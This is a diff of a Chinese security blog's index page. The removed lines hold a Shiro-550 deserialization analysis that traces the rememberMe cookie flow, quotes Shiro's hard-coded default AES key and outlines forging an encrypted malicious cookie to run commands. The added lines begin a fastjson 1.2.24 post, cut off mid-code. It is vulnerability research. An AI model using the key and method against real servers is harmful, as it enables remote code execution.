@@ -175,7 +175,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/02/shiro-550/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -188,7 +188,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/10/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">fastjson 漏洞分析</a>
+          <a href="/2022/10/02/shiro-550/" class="post-title-link" itemprop="url">shiro-550 漏洞分析</a>
         </h2>
 
         <div class="post-meta-container">
@@ -199,143 +199,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-01-10 20:09:11" itemprop="dateCreated datePublished" datetime="2022-01-10T20:09:11+08:00">2022-01-10</time>
+      <time title="创建时间：2022-10-02 17:20:24" itemprop="dateCreated datePublished" datetime="2022-10-02T17:20:24+08:00">2022-10-02</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-01-24 10:43:27" itemprop="dateModified" datetime="2022-01-24T10:43:27+08:00">2022-01-24</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h2><p>影响版本：fastjson&lt;=1.2.24</p>
-<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>在AbstractRememberMeManager#onSuccessfulLogin()下断点，使用root/secret选择Remember Me登录</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    	<span class="comment">// 清理之前认证的用户身份</span></span><br><span class="line">        forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//now save the new identity:</span></span><br><span class="line">    	<span class="comment">// 登录时是否选择Rememberme或者记住我</span></span><br><span class="line">        <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">            rememberIdentity(subject, token, info);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进rememberIdentity</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token,AuthenticationInfo authcInfo)</span> </span>&#123;</span><br><span class="line">        PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);</span><br><span class="line">    </span><br><span class="line">    	<span class="comment">// 这时principals值为root，为登录时的用户名</span></span><br><span class="line">        rememberIdentity(subject, principals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进rememberIdentity</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">    	<span class="comment">// 这时accountPrincipals值为root，为登录时的用户名</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">        rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进convertPrincipalsToBytes</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    	<span class="comment">// principals值为root，序列化root为字节数组</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(principals);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 对root后的字节数组进行加密，跟进</span></span><br><span class="line">            bytes = encrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进encrypt</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    	<span class="comment">// 获取加密方式，加密方式为AES CBC PKCS5Padding</span></span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//进行加密</span></span><br><span class="line">            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">            value = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先看getEncryptionCipherKey()，根据字面意思是获取加密的密钥，因为这里使用AES加密，所以是AES的key，跟进</p>
-<p>getEncryptionCipherKey()，发现没有key相关信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public byte[] getEncryptionCipherKey() &#123;</span><br><span class="line">        return encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>encryptionCipherKey是一个常量，find usages，查找到setEncryptionCipherKey()中对encryptionCipherKey进行了赋值，alt+F7查看調用,发现setCipherKey进行了调用，继续查找调用关系,AbstractRememberMeManager类的构造函数中调用了setCipherKey</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.serializer = <span class="keyword">new</span> DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="keyword">this</span>.cipherService = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">    	<span class="comment">// 设置key</span></span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DEFAULT_CIPHER_KEY_BYTES为AES加密使用的key，为硬编码</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>此时确认了加密key，跟进cipherService.encrypt()</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] ivBytes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> generate = isGenerateInitializationVectors(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (generate) &#123;</span><br><span class="line">            ivBytes = generateInitializationVector(<span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (ivBytes == <span class="keyword">null</span> || ivBytes.length == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Initialization vector generation is enabled - generated vector&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cannot be null or empty.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">//此时进行加密</span></span><br><span class="line">        <span class="keyword">return</span> encrypt(plaintext, key, ivBytes, generate);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这时convertPrincipalsToBytes()内部逻辑跟进完成，进入下一步，跟进rememberSerializedIdentity(subject, bytes)</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="keyword">byte</span>[] serialized)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">        HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">        HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//base 64 encode it and store as a cookie:</span></span><br><span class="line">        <span class="comment">// 进行base64编码，作为cookie存储</span></span><br><span class="line">        String base64 = Base64.encodeToString(serialized);</span><br><span class="line">		</span><br><span class="line">        Cookie template = getCookie(); <span class="comment">//the class attribute is really a template for the outgoing cookies</span></span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> SimpleCookie(template);</span><br><span class="line">    	<span class="comment">// 把base64编码后的值设置给remeberMe参数</span></span><br><span class="line">        cookie.setValue(base64);</span><br><span class="line">    	<span class="comment">// 保存到请求响应中</span></span><br><span class="line">        cookie.saveTo(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这时，整个加密流程结束，通过上述逻辑，可以总结加密流程如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名序列化---&gt;  AES加密(key硬编码为kPH+bIxk5D2deZiIxcaaaA==)  ---&gt; base64 ---&gt; 作为值存储到cookie的remeberMe参数中</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h2><p>在DefaultSecurityManager#getRememberedIdentity()打断点</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">getRememberedIdentity</span><span class="params">(SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        RememberMeManager rmm = getRememberMeManager();</span><br><span class="line">        <span class="keyword">if</span> (rmm != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 跟进</span></span><br><span class="line">                <span class="keyword">return</span> rmm.getRememberedPrincipals(subjectContext);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                    String msg = <span class="string">&quot;Delegate RememberMeManager instance of type [&quot;</span> + rmm.getClass().getName() +</span><br><span class="line">                            <span class="string">&quot;] threw an exception during getRememberedPrincipals().&quot;</span>;</span><br><span class="line">                    log.warn(msg, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进rmm.getRememberedPrincipals(subjectContext)</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> PrincipalCollection <span class="title">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        PrincipalCollection principals = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 跟进点1</span></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">            <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">            <span class="keyword">if</span> (bytes != <span class="keyword">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//跟进点2</span></span><br><span class="line">                principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">            principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> principals;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>先看getRememberedSerializedIdentity,<strong>英文注释其实已经说明了当前函数的含义，对cookie进行base64解码</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                String msg = <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        WebSubjectContext wsc = (WebSubjectContext) subjectContext;</span><br><span class="line">        <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        HttpServletRequest request = WebUtils.getHttpRequest(wsc);</span><br><span class="line">        HttpServletResponse response = WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">    	<span class="comment">// 获取cookie信息</span></span><br><span class="line">        String base64 = getCookie().readValue(request, response);</span><br><span class="line">        <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">        <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">        <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (base64 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            base64 = ensurePadding(base64);</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 具体base64解码位置</span></span><br><span class="line">            <span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="keyword">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> decoded;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>再跟进<code>convertBytesToPrincipals</code>函数</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>继续跟进<code>decrypt</code>，该函数作用是进行AES解密，返回序列化的数据</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再进行反序列化deserialize(bytes)</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] serializedIdentity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进deserialize，最终调用了readObject()进行反序列化</p>
-<p>总结解密过程</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取cookie中的rememberMe字段的值 ---&gt; base64解码 ---&gt; AES解密 ---&gt; readObject()反序列化获取到用户名</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="出现漏洞的原因"><a href="#出现漏洞的原因" class="headerlink" title="出现漏洞的原因"></a>出现漏洞的原因</h2><p>通过上述加解密过程，可知有一个重要环节是作为攻击者是可猜解的，那就是AES加密使用的key，因为是硬编码的。如果攻击者爆破出了可用的key，那么构造一段序列化的恶意payload，按照上述加密流程加密，作为remeberMe的值发送到服务端，如果此时服务端依赖存在漏洞的commons collections版本或者commons beanutils版本，那么攻击者可以触发反序列化漏洞，进行任意命令执行。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/07/shiro-550/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="0lh">
-      <meta itemprop="description" content="漏洞分析">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0lh的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/07/shiro-550/" class="post-title-link" itemprop="url">shiro-550 漏洞分析</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-01-07 15:03:24" itemprop="dateCreated datePublished" datetime="2022-01-07T15:03:24+08:00">2022-01-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-01-24 10:44:12" itemprop="dateModified" datetime="2022-01-24T10:44:12+08:00">2022-01-24</time>
+      <time title="修改时间：2022-01-26 11:14:15" itemprop="dateModified" datetime="2022-01-26T11:14:15+08:00">2022-01-26</time>
     </span>
 
   
@@ -433,7 +304,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/05/cc1-lazymap/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/05/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -446,7 +317,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/05/cc1-lazymap/" class="post-title-link" itemprop="url">apache commons collections 1 漏洞分析-LazyMap版本</a>
+          <a href="/2021/10/05/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">fastjson-1.2.24反序列化漏洞 JdbcRowSetImpl链分析</a>
         </h2>
 
         <div class="post-meta-container">
@@ -456,9 +327,129 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-01-05 09:14:53 / 修改时间：12:32:23" itemprop="dateCreated datePublished" datetime="2022-01-05T09:14:53+08:00">2022-01-05</time>
+      <time title="创建时间：2021-10-05 20:09:11" itemprop="dateCreated datePublished" datetime="2021-10-05T20:09:11+08:00">2021-10-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-26 11:11:37" itemprop="dateModified" datetime="2022-01-26T11:11:37+08:00">2022-01-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h2><p>影响版本：fastjson&lt;=1.2.24</p>
+<h2 id="fastjson基本使用"><a href="#fastjson基本使用" class="headerlink" title="fastjson基本使用"></a>fastjson基本使用</h2><p>User类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name 